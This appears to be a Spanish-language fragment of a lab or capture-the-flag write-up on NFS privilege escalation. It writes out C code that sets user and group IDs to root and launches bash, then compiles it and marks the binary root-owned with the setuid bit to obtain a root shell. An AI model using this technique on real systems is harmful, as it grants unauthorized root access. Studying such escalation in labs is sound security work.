Al parecer puedo crear un binario aprovechando los permisos de nfs y ejecutarlo para conseguir una shell como root.

cat > shell.c << 'EOF'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
EOF
gcc -o bash shell.c

sudo chown root:root bash
sudo chmod u+s bash

